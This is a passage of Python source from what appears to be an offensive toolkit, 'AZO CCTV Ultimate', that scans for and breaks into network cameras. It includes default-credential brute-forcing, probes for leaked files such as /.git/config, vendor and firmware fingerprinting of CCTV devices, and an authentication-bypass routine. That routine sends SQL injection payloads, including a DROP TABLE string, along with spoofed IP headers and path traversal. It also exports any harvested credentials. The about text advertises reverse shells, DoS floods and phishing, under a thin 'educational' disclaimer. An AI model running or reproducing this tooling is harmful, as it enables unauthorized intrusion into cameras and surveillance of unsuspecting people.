                for username, password in self.credentials[:5]:  # Test top 5 credentials
                    try:
                        test_url = f"http://{target}{endpoint}"
                        resp = self.make_request(test_url, auth=(username, password), timeout=3)
                        if resp and resp['status'] == 200:
                            print(f"[!] WEAK CREDENTIALS: {username}:{password}")
                            vulnerabilities_found.append(f"Weak credentials: {username}:{password}")
                            f.write(f"WEAK AUTH: {username}:{password} on {endpoint}\\n")
                            break
                    except:
                        continue
            
            f.write("\\n")
            
            # 5. Information Disclosure
            print("[*] Phase 5: Information Disclosure...")
            f.write("5. INFORMATION DISCLOSURE\\n")
            f.write("-" * 25 + "\\n")
            
            info_paths = [
                "/robots.txt", "/.htaccess", "/config.txt", "/admin.txt",
                "/backup/", "/temp/", "/.git/config", "/.svn/",
                "/phpinfo.php", "/test.php", "/info.php"
            ]
            
            for path in info_paths:
                try:
                    test_url = f"http://{target}{path}"
                    resp = self.make_request(test_url, timeout=3)
                    if resp and resp['status'] == 200:
                        print(f"[+] Information leak: {path}")
                        f.write(f"INFO LEAK: {path}\\n")
                except:
                    continue
            
            # 6. Summary
            f.write("\\n" + "="*60 + "\\n")
            f.write("SCAN SUMMARY\\n")
            f.write("="*60 + "\\n")
            f.write(f"Vulnerabilities found: {len(vulnerabilities_found)}\\n")
            f.write(f"Open ports: {len(open_ports)}\\n")
            f.write(f"Services identified: {len(services)}\\n\\n")
            
            if vulnerabilities_found:
                f.write("VULNERABILITIES:\\n")
                for vuln in vulnerabilities_found:
                    f.write(f"- {vuln}\\n")
        
        print(f"\\n[+] Advanced scan completed")
        print(f"[+] Vulnerabilities found: {len(vulnerabilities_found)}")
        print(f"[+] Report saved: {report_file}")
        
        # Add to statistics
        self.exploits_found.extend(vulnerabilities_found)
        
        self.ask_next_action(self.advanced_vuln_scanner, self.azo_advanced_features)

    def device_fingerprinting(self):
        """Device fingerprinting"""
        print("\n--- Device Fingerprinting ---")
        
        target = input("Enter target IP or URL: ").strip()
        if not target:
            print("[-] Target required")
            self.ask_next_action(self.device_fingerprinting, self.azo_advanced_features)
            return
        
        print(f"[*] Fingerprinting device: {target}")
        
        # Create fingerprint report
        fingerprint_id = datetime.now().strftime('%Y%m%d_%H%M%S')
        report_file = f"{self.output_dir}/reports/fingerprint_{fingerprint_id}.txt"
        
        device_info = {}
        
        with open(report_file, 'w') as f:
            f.write(f"Device Fingerprinting Report\\n")
            f.write(f"Target: {target}\\n")
            f.write(f"Scan ID: {fingerprint_id}\\n")
            f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\\n")
            f.write("="*50 + "\\n\\n")
            
            # 1. HTTP Headers Analysis
            print("[*] Analyzing HTTP headers...")
            f.write("1. HTTP HEADERS ANALYSIS\\n")
            f.write("-" * 25 + "\\n")
            
            try:
                resp = self.make_request(f"http://{target}", timeout=5)
                if resp:
                    headers = resp['headers']
                    
                    # Server identification
                    server = headers.get('Server', 'Unknown')
                    device_info['server'] = server
                    print(f"[+] Server: {server}")
                    f.write(f"Server: {server}\\n")
                    
                    # Look for device-specific headers
                    device_headers = {
                        'X-Powered-By': 'Technology',
                        'WWW-Authenticate': 'Auth Method',
                        'Set-Cookie': 'Session Info',
                        'Content-Type': 'Content Type',
                        'Last-Modified': 'Last Modified'
                    }
                    
                    for header, description in device_headers.items():
                        if header in headers:
                            value = headers[header]
                            print(f"[+] {description}: {value}")
                            f.write(f"{description}: {value}\\n")
                            device_info[header.lower()] = value
            except Exception as e:
                print(f"[-] HTTP analysis failed: {e}")
                f.write(f"HTTP analysis failed: {e}\\n")
            
            f.write("\\n")
            
            # 2. Banner Grabbing
            print("[*] Banner grabbing on common ports...")
            f.write("2. BANNER GRABBING\\n")
            f.write("-" * 18 + "\\n")
            
            banner_ports = [21, 22, 23, 25, 80, 110, 443, 554, 8080]
            
            for port in banner_ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3)
                    sock.connect((target, port))
                    
                    if port in [80, 8080, 443]:
                        # HTTP banner
                        sock.send(b"GET / HTTP/1.1\\r\\nHost: " + target.encode() + b"\\r\\n\\r\\n")
                    else:
                        # TCP banner
                        pass
                    
                    banner = sock.recv(1024).decode('utf-8', errors='ignore')
                    if banner:
                        print(f"[+] Port {port} banner: {banner[:100]}...")
                        f.write(f"Port {port}: {banner[:200]}\\n")
                        device_info[f'banner_{port}'] = banner[:200]
                    
                    sock.close()
                except:
                    continue
            
            f.write("\\n")
            
            # 3. CCTV Device Detection
            print("[*] CCTV device detection...")
            f.write("3. CCTV DEVICE DETECTION\\n")
            f.write("-" * 23 + "\\n")
            
            cctv_signatures = {
                "hikvision": ["hikvision", "DS-", "/ISAPI/", "HiLookVision"],
                "dahua": ["dahua", "DH-", "/RPC2", "DahuaVision"],
                "axis": ["axis", "ACCC", "/axis-cgi/", "AxisVideo"],
                "vivotek": ["vivotek", "VIVOTEK", "/cgi-bin/viewer/"],
                "foscam": ["foscam", "FOSCAM", "/videostream.cgi"],
                "tp-link": ["tp-link", "TPLINK", "TL-"],
                "d-link": ["d-link", "DLINK", "DCS-"],
                "sony": ["sony", "SNC-", "sony network camera"]
            }
            
            detected_vendor = "Unknown"
            
            try:
                resp = self.make_request(f"http://{target}", timeout=5)
                if resp:
                    content = resp['content'].lower()
                    headers = str(resp['headers']).lower()
                    
                    for vendor, signatures in cctv_signatures.items():
                        for signature in signatures:
                            if signature.lower() in content or signature.lower() in headers:
                                detected_vendor = vendor.title()
                                print(f"[+] Detected vendor: {detected_vendor}")
                                f.write(f"Vendor: {detected_vendor}\\n")
                                device_info['vendor'] = detected_vendor
                                break
                        if detected_vendor != "Unknown":
                            break
            except:
                pass
            
            f.write("\\n")
            
            # 4. OS Detection
            print("[*] Operating system detection...")
            f.write("4. OS DETECTION\\n")
            f.write("-" * 13 + "\\n")
            
            try:
                # TTL-based OS detection (simplified)
                response = os.system(f"ping -c 1 {target} > /dev/null 2>&1")
                if response == 0:
                    print(f"[+] Host is reachable")
                    f.write("Host status: REACHABLE\\n")
                    
                    # Try to detect OS from HTTP headers
                    resp = self.make_request(f"http://{target}", timeout=5)
                    if resp:
                        server = resp['headers'].get('Server', '').lower()
                        if 'linux' in server or 'unix' in server:
                            os_guess = "Linux/Unix"
                        elif 'windows' in server or 'iis' in server:
                            os_guess = "Windows"
                        elif 'apache' in server:
                            os_guess = "Linux (Apache)"
                        elif 'nginx' in server:
                            os_guess = "Linux (Nginx)"
                        else:
                            os_guess = "Unknown"
                        
                        print(f"[+] OS guess: {os_guess}")
                        f.write(f"OS: {os_guess}\\n")
                        device_info['os'] = os_guess
                else:
                    print("[-] Host unreachable")
                    f.write("Host status: UNREACHABLE\\n")
            except:
                pass
            
            f.write("\\n")
            
            # 5. Firmware Detection
            print("[*] Firmware version detection...")
            f.write("5. FIRMWARE DETECTION\\n")
            f.write("-" * 19 + "\\n")
            
            firmware_paths = [
                "/system/deviceInfo", "/cgi-bin/hi3510/param.cgi?cmd=getserverinfo",
                "/ISAPI/System/deviceInfo", "/cgi-bin/magicBox.cgi?action=getSystemInfo"
            ]
            
            for path in firmware_paths:
                try:
                    resp = self.make_request(f"http://{target}{path}", timeout=3)
                    if resp and resp['status'] == 200:
                        content = resp['content']
                        
                        # Look for version information
                        version_patterns = [
                            r'version["\']?:\s*["\']?([^"\'\\s,}]+)',
                            r'firmware["\']?:\s*["\']?([^"\'\\s,}]+)',
                            r'V(\d+\.\d+\.\d+)',
                            r'ver["\']?:\s*["\']?([^"\'\\s,}]+)'
                        ]
                        
                        for pattern in version_patterns:
                            import re
                            match = re.search(pattern, content, re.IGNORECASE)
                            if match:
                                firmware = match.group(1)
                                print(f"[+] Firmware version: {firmware}")
                                f.write(f"Firmware: {firmware}\\n")
                                device_info['firmware'] = firmware
                                break
                except:
                    continue
            
            # 6. Summary
            f.write("\\n" + "="*50 + "\\n")
            f.write("FINGERPRINT SUMMARY\\n")
            f.write("="*50 + "\\n")
            
            for key, value in device_info.items():
                f.write(f"{key.title()}: {value}\\n")
        
        print(f"\\n[+] Device fingerprinting completed")
        print(f"[+] Device info collected: {len(device_info)} attributes")
        print(f"[+] Report saved: {report_file}")
        
        if detected_vendor != "Unknown":
            print(f"[+] Detected device: {detected_vendor}")
        
        self.ask_next_action(self.device_fingerprinting, self.azo_advanced_features)

    def waf_detection(self):
        """WAF/IDS detection"""
        print("\n--- WAF/IDS Detection ---")
        target = input("Enter target IP or URL: ").strip()
        
        if not target:
            print("Invalid target!")
            return
        
        print(f"[*] Detecting WAF/IDS on: {target}")
        
        resp = self.make_request(f"http://{target}")
        if resp:
            headers = resp['headers']
            content = resp['content'].lower()
            
            detected_wafs = []
            for waf_name, signatures in self.waf_signatures.items():
                for signature in signatures:
                    if any(signature.lower() in str(headers).lower() for header in headers) or signature.lower() in content:
                        detected_wafs.append(waf_name)
                        break
            
            if detected_wafs:
                print(f"[+] WAF/IDS detected: {', '.join(detected_wafs)}")
            else:
                print("[-] No WAF/IDS detected")
        else:
            print("[-] Failed to connect to target")
        
        self.ask_next_action(self.waf_detection, self.azo_advanced_features)

    def stealth_mode_config(self):
        """Stealth mode configuration"""
        print("\n--- Stealth Mode Configuration ---")
        print(f"[*] Current stealth mode: {'ON' if self.stealth_mode else 'OFF'}")
        
        toggle = input("Toggle? (y/n): ").lower()
        if toggle == 'y':
            self.stealth_mode = not self.stealth_mode
            print(f"[+] Stealth mode {'enabled' if self.stealth_mode else 'disabled'}")
        
        self.ask_next_action(self.stealth_mode_config, self.azo_advanced_features)

    def auth_bypass_test(self):
        """Authentication bypass test"""
        print("\n--- Authentication Bypass Test ---")
        
        target = input("Enter target IP or URL: ").strip()
        if not target:
            print("[-] Target required")
            self.ask_next_action(self.auth_bypass_test, self.azo_advanced_features)
            return
        
        print(f"[*] Testing authentication bypass on: {target}")
        print("[*] Testing multiple bypass techniques...")
        
        bypass_results = []
        
        # 1. SQL Injection bypass
        print("\\n[*] Testing SQL injection bypass...")
        sql_payloads = [
            "admin'--", "admin'/*", "' OR '1'='1'--", "' OR '1'='1'/*",
            "' OR 1=1--", "admin') OR ('1'='1'--", "1' OR '1'='1",
            "' UNION SELECT 1--", "admin'; DROP TABLE users;--"
        ]
        
        for payload in sql_payloads[:3]:  # Test first 3
            try:
                data = {"username": payload, "password": "anything"}
                resp = self.make_request(f"http://{target}/login", method='POST', data=data, timeout=3)
                if resp and (resp['status'] == 200 or resp['status'] == 302):
                    if "dashboard" in resp['content'].lower() or "admin" in resp['content'].lower():
                        print(f"[!] SQL injection bypass successful: {payload}")
                        bypass_results.append(f"SQL injection: {payload}")
            except:
                continue
        
        # 2. Default credential bypass
        print("\\n[*] Testing default credentials...")
        for username, password in self.credentials[:10]:  # Test first 10
            try:
                resp = self.make_request(f"http://{target}", auth=(username, password), timeout=3)
                if resp and resp['status'] == 200:
                    if "login" not in resp['content'].lower():
                        print(f"[!] Default credentials bypass: {username}:{password}")
                        bypass_results.append(f"Default credentials: {username}:{password}")
                        break
            except:
                continue
        
        # 3. HTTP Header bypass
        print("\\n[*] Testing HTTP header bypass...")
        bypass_headers = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
            {"Authorization": "Basic YWRtaW46YWRtaW4="}  # admin:admin
        ]
        
        for headers in bypass_headers:
            try:
                resp = self.make_request(f"http://{target}/admin", headers=headers, timeout=3)
                if resp and resp['status'] == 200:
                    if "admin" in resp['content'].lower() and "login" not in resp['content'].lower():
                        print(f"[!] Header bypass successful: {list(headers.keys())[0]}")
                        bypass_results.append(f"Header bypass: {list(headers.keys())[0]}")
            except:
                continue
        
        # 4. Path traversal bypass
        print("\\n[*] Testing path traversal bypass...")
        traversal_paths = [
            "/admin/../admin/", "/./admin/", "/admin/./",
            "/../admin/", "/admin/../", "/admin/../../admin/"
        ]
        
        for path in traversal_paths:
            try:
                resp = self.make_request(f"http://{target}{path}", timeout=3)
                if resp and resp['status'] == 200:
                    if "admin" in resp['content'].lower():
                        print(f"[!] Path traversal bypass: {path}")
                        bypass_results.append(f"Path traversal: {path}")
            except:
                continue
        
        # 5. Parameter pollution
        print("\\n[*] Testing parameter pollution...")
        pollution_tests = [
            {"username": ["admin", "user"], "password": "admin"},
            {"username": "admin", "password": ["admin", "123456"]},
        ]
        
        for params in pollution_tests:
            try:
                resp = self.make_request(f"http://{target}/login", method='POST', data=params, timeout=3)
                if resp and resp['status'] == 302:
                    print(f"[!] Parameter pollution bypass successful")
                    bypass_results.append("Parameter pollution bypass")
                    break
            except:
                continue
        
        # Save results
        if bypass_results:
            report_file = f"{self.output_dir}/reports/auth_bypass_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            
            with open(report_file, 'w') as f:
                f.write(f"Authentication Bypass Test Report\\n")
                f.write(f"Target: {target}\\n")
                f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\\n")
                f.write("="*40 + "\\n\\n")
                
                f.write(f"Bypass methods found: {len(bypass_results)}\\n\\n")
                
                for i, result in enumerate(bypass_results, 1):
                    f.write(f"{i}. {result}\\n")
            
            print(f"\\n[+] Authentication bypass test completed")
            print(f"[+] Bypass methods found: {len(bypass_results)}")
            print(f"[+] Report saved: {report_file}")
            
            # Add to exploits
            self.exploits_found.extend(bypass_results)
        else:
            print("\\n[-] No authentication bypass methods found")
        
        self.ask_next_action(self.auth_bypass_test, self.azo_advanced_features)

    def export_results(self):
        """Export results"""
        print("\n--- Export Results ---")
        
        if not self.results and not self.exploits_found and not self.credentials_found:
            print("[-] No results to export")
            self.ask_next_action(self.export_results, self.show_statistics)
            return
        
        export_menu = """
        [1] Export to CSV
        [2] Export to JSON
        [3] Export to XML
        [4] Export to HTML Report
        [5] Export All Formats
        [0] Back
        """
        print(export_menu)
        
        choice = input("root@{}/Export:~$ ".format(self.username))
        
        if choice == "0":
            return
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        try:
            if choice == "1" or choice == "5":
                # CSV Export
                csv_file = f"{self.output_dir}/exports/results_{timestamp}.csv"
                with open(csv_file, 'w') as f:
                    f.write("Type,Item,Timestamp\\n")
                    for camera in self.results:
                        f.write(f"Camera,{camera},{timestamp}\\n")
                    for exploit in self.exploits_found:
                        f.write(f"Exploit,{exploit},{timestamp}\\n")
                    for cred in self.credentials_found:
                        f.write(f"Credential,{cred},{timestamp}\\n")
                print(f"[+] CSV exported: {csv_file}")
            
            if choice == "2" or choice == "5":
                # JSON Export
                import json
                json_file = f"{self.output_dir}/exports/results_{timestamp}.json"
                data = {
                    "export_info": {
                        "timestamp": timestamp,
                        "tool": "AZO CCTV Ultimate",
                        "version": self.version
                    },
                    "results": {
                        "cameras": self.results,
                        "exploits": self.exploits_found,
                        "credentials": self.credentials_found,
                        "statistics": {
                            "total_cameras": len(self.results),
                            "total_exploits": len(self.exploits_found),
                            "total_credentials": len(self.credentials_found),
                            "countries_scanned": len(self.country_stats)
                        }
                    }
                }
                
                with open(json_file, 'w') as f:
                    json.dump(data, f, indent=2)
                print(f"[+] JSON exported: {json_file}")
            
            if choice == "3" or choice == "5":
                # XML Export
                xml_file = f"{self.output_dir}/exports/results_{timestamp}.xml"
                with open(xml_file, 'w') as f:
                    f.write('<?xml version="1.0" encoding="UTF-8"?>\\n')
                    f.write(f'<azo_scan timestamp="{timestamp}">\\n')
                    
                    f.write('  <cameras>\\n')
                    for camera in self.results:
                        f.write(f'    <camera>{camera}</camera>\\n')
                    f.write('  </cameras>\\n')
                    
                    f.write('  <exploits>\\n')
                    for exploit in self.exploits_found:
                        f.write(f'    <exploit>{exploit}</exploit>\\n')
                    f.write('  </exploits>\\n')
                    
                    f.write('  <credentials>\\n')
                    for cred in self.credentials_found:
                        f.write(f'    <credential>{cred}</credential>\\n')
                    f.write('  </credentials>\\n')
                    
                    f.write('</azo_scan>\\n')
                print(f"[+] XML exported: {xml_file}")
            
            if choice == "4" or choice == "5":
                # HTML Report Export
                html_file = f"{self.output_dir}/exports/report_{timestamp}.html"
                
                html_content = f'''<!DOCTYPE html>
<html>
<head>
    <title>AZO CCTV Ultimate - Scan Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        .header {{ background: #2c3e50; color: white; padding: 20px; }}
        .section {{ margin: 20px 0; }}
        .stats {{ background: #ecf0f1; padding: 15px; border-radius: 5px; }}
        .result-item {{ background: #f8f9fa; margin: 5px 0; padding: 10px; border-left: 4px solid #3498db; }}
        .exploit {{ border-left-color: #e74c3c; }}
        .credential {{ border-left-color: #f39c12; }}
        table {{ width: 100%; border-collapse: collapse; }}
        th, td {{ padding: 8px; text-align: left; border-bottom: 1px solid #ddd; }}
        th {{ background: #34495e; color: white; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>AZO CCTV Ultimate - Scan Report</h1>
        <p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        <p>Version: {self.version}</p>
    </div>
    
    <div class="section">
        <h2>Statistics</h2>
        <div class="stats">
            <p><strong>Cameras Found:</strong> {len(self.results)}</p>
            <p><strong>Exploits Found:</strong> {len(self.exploits_found)}</p>
            <p><strong>Credentials Found:</strong> {len(self.credentials_found)}</p>
            <p><strong>Countries Scanned:</strong> {len(self.country_stats)}</p>
        </div>
    </div>
    
    <div class="section">
        <h2>Cameras Found</h2>
        <table>
            <tr><th>Camera URL</th></tr>'''
                
                for camera in self.results:
                    html_content += f'<tr><td>{camera}</td></tr>'
                
                html_content += '''
        </table>
    </div>
    
    <div class="section">
        <h2>Exploits Found</h2>
        <table>
            <tr><th>Exploit</th></tr>'''
                
                for exploit in self.exploits_found:
                    html_content += f'<tr><td>{exploit}</td></tr>'
                
                html_content += '''
        </table>
    </div>
    
    <div class="section">
        <h2>Credentials Found</h2>
        <table>
            <tr><th>Credentials</th></tr>'''
                
                for cred in self.credentials_found:
                    html_content += f'<tr><td>{cred}</td></tr>'
                
                html_content += '''
        </table>
    </div>
</body>
</html>'''
                
                with open(html_file, 'w') as f:
                    f.write(html_content)
                print(f"[+] HTML report exported: {html_file}")
            
            print(f"\\n[+] Export completed successfully!")
            
        except Exception as e:
            print(f"[-] Export failed: {e}")
        
        self.ask_next_action(self.export_results, self.show_statistics)

    # ========================= ADVANCED SETTINGS =========================

    def advanced_settings(self):
        """Advanced settings menu"""
        menu_intro("Advanced Settings")
        
        settings_menu = f"""
        ┌─────────────────────────────────────────────────┐
        │            ADVANCED SETTINGS                    │
        ├─────────────────────────────────────────────────┤
        │ [1] Timeout: {self.timeout}s                             │
        │ [2] Max Workers: {self.max_workers}                      │
        │ [3] Rate Limit: {self.rate_limit}s                       │
        │ [4] Stealth Mode: {'ON' if self.stealth_mode else 'OFF'}                    │
        │ [5] Verbose: {'ON' if self.verbose else 'OFF'}                         │
        │ [6] Tor: {'ON' if self.tor_enabled else 'OFF'}                            │
        ├─────────────────────────────────────────────────┤
        │ [0] Back to Main Menu                           │
        └─────────────────────────────────────────────────┘
        """
        print(settings_menu)
        
        choice = input(f" root@{self.username}/Config:~$ ")
        
        if choice == "1":
            new_timeout = input(f"New timeout (current: {self.timeout}s): ")
            try:
                self.timeout = int(new_timeout)
                self.log('SUCCESS', f"Timeout set to {self.timeout}s")
            except ValueError:
                self.log('ERROR', "Invalid value!")
        elif choice == "2":
            new_workers = input(f"New max workers (current: {self.max_workers}): ")
            try:
                self.max_workers = int(new_workers)
                self.log('SUCCESS', f"Max workers set to {self.max_workers}")
            except ValueError:
                self.log('ERROR', "Invalid value!")
        elif choice == "3":
            new_rate = input(f"New rate limit (current: {self.rate_limit}s): ")
            try:
                self.rate_limit = float(new_rate)
                self.log('SUCCESS', f"Rate limit set to {self.rate_limit}s")
            except ValueError:
                self.log('ERROR', "Invalid value!")
        elif choice == "4":
            self.stealth_mode = not self.stealth_mode
            self.log('SUCCESS', f"Stealth mode {'enabled' if self.stealth_mode else 'disabled'}")
        elif choice == "5":
            self.verbose = not self.verbose
            self.log('SUCCESS', f"Verbose {'enabled' if self.verbose else 'disabled'}")
        elif choice == "6":
            self.tor_enabled = not self.tor_enabled
            self.log('SUCCESS', f"Tor {'enabled' if self.tor_enabled else 'disabled'}")
        elif choice == "0":
            return
        
        time.sleep(1)
        self.advanced_settings()

    # ========================= STATISTICS =========================

    def show_statistics(self):
        """Show statistics and reports"""
        menu_intro("Statistics & Reports")
        
        stats = f"""
        ┌─────────────────────────────────────────────────┐
        │               STATISTICS                        │
        ├─────────────────────────────────────────────────┤
        │ Cameras found: {len(self.results)}                        │
        │ Exploits found: {len(self.exploits_found)}                       │
        │ Credentials found: {len(self.credentials_found)}                  │
        │ Countries scanned: {len(self.country_stats)}                        │
        ├─────────────────────────────────────────────────┤
        │ [1] Generate detailed report                    │
        │ [2] Export results                              │
        │ [3] Clear statistics                            │
        │ [0] Back                                        │
        └─────────────────────────────────────────────────┘
        """
        print(stats)
        
        choice = input(f" root@{self.username}/Stats:~$ ")
        
        if choice == "1":
            self.generate_report()
        elif choice == "2":
            self.export_results()
        elif choice == "3":
            self.clear_statistics()
        elif choice == "0":
            return
        
        time.sleep(1)
        self.show_statistics()

    def generate_report(self):
        """Generate detailed report"""
        print("\n--- Generate Report ---")
        print("[*] Generating detailed report...")
        
        report_file = f"{self.output_dir}/reports/report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        with open(report_file, 'w') as f:
            f.write("AZO CCTV ULTIMATE - DETAILED REPORT\n")
            f.write("="*50 + "\n")
            f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Cameras found: {len(self.results)}\n")
            f.write(f"Exploits found: {len(self.exploits_found)}\n")
            f.write(f"Credentials found: {len(self.credentials_found)}\n")
            f.write("\n--- DETAILS ---\n")
            if self.results:
                f.write("Cameras:\n")
                for result in self.results:
                    f.write(f"  {result}\n")
            if self.exploits_found:
                f.write("Exploits:\n")
                for exploit in self.exploits_found:
                    f.write(f"  {exploit}\n")
            if self.credentials_found:
                f.write("Credentials:\n")
                for cred in self.credentials_found:
                    f.write(f"  {cred}\n")
        
        print(f"[+] Report saved to: {report_file}")

    def clear_statistics(self):
        """Clear statistics"""
        print("\n--- Clear Statistics ---")
        confirm = input("Are you sure? (y/n): ").lower()
        if confirm == 'y':
            self.results = []
            self.exploits_found = []
            self.credentials_found = []
            self.country_stats = {}
            print("[+] Statistics cleared")

    # ========================= ABOUT =========================

    def show_about(self):
        """Show about information"""
        menu_intro("About & Help")
        
        about_text = f"""
        ╔═══════════════════════════════════════════════════════════════╗
        ║                       AZO TOOLKIT                             ║
        ║                Advanced Security Suite                        ║
        ╠═══════════════════════════════════════════════════════════════╣
        ║                                                               ║
        ║ Author: 09AZO14                                               ║
        ║ Enhanced with: Advanced Intelligence Features                ║
        ║ Version: {self.version}                                ║
        ║                                                               ║
        ║ Integrated Features:                                          ║
        ║   • Web Hacking Tools (SQLMap, XSStrike, WPScan, etc)        ║
        ║   • Network Scanner (ARP scan, port scan, etc)               ║
        ║   • Remote Access (reverse shells, payloads)                 ║
        ║   • DoS Attack (HTTP flood, SYN flood, etc)                  ║
        ║   • IP Geolocation (IP geolocation)                          ║
        ║   • CCTV Scanner (advanced camera scanner)                   ║
        ║   • OSINT Tools (intelligence frameworks)                    ║
        ║   • Phishing Kit (phishing tools)                            ║
        ║   • AZO CCTV Original (unique features)                      ║
        ║                                                               ║
        ║ WARNING: For educational purposes only!                      ║
        ║ Use responsibly and with proper authorization.               ║
        ║                                                               ║
        ╚═══════════════════════════════════════════════════════════════╝
        """
        
        print(about_text)
        input("\nPress Enter to continue...")

    # ========================= UTILITY FUNCTIONS =========================

    def ask_next_action(self, current_func, back_func):
        """Ask user for next action"""
        try:
            print("\n [1] Repeat")
            print(" [2] Back to previous menu") 
            print(" [3] Main menu")
            choice = input(f" root@{self.username}:~$ ")
            
            if choice == "1":
                current_func()
            elif choice == "2":
                back_func()
            elif choice == "3":
                return
            else:
                print("Invalid option. Going back to main menu.")
        except KeyboardInterrupt:
            print("\n[*] Interrupted by user")

    def run(self):
        """Main execution function"""
        self.setup_directories()
        
        while True:
            try:
                choice = self.show_main_menu()
                
                if choice == "1":
                    self.web_hacking_menu()
                elif choice == "2":
                    self.network_scanner_menu()
                elif choice == "3":
                    self.remote_access_menu()
                elif choice == "4":
                    self.dos_attack_menu()
                elif choice == "5":
                    self.ip_geolocation()
                elif choice == "6":
                    self.cctv_scanner_menu()
                elif choice == "7":
                    self.osint_menu()
                elif choice == "8":
                    self.phishing_menu()
                elif choice == "9":
                    self.azo_advanced_features()
                elif choice == "10":
                    self.advanced_settings()
                elif choice == "11":
                    self.show_statistics()
                elif choice == "99":
                    self.show_about()
                elif choice == "0":
                    print("\n[*] Exiting program...")
                    sys.exit()
                else:
                    print("Invalid option! Try again.")
                    time.sleep(1)
                    
            except KeyboardInterrupt:
                print("\n[*] Program interrupted by user...")
                sys.exit()

def main():
    """Main function"""
    try:
        toolkit = AZOToolkit()
        toolkit.run()
    except KeyboardInterrupt:
        print("\n[!] Program interrupted by user.")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Fatal error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main() 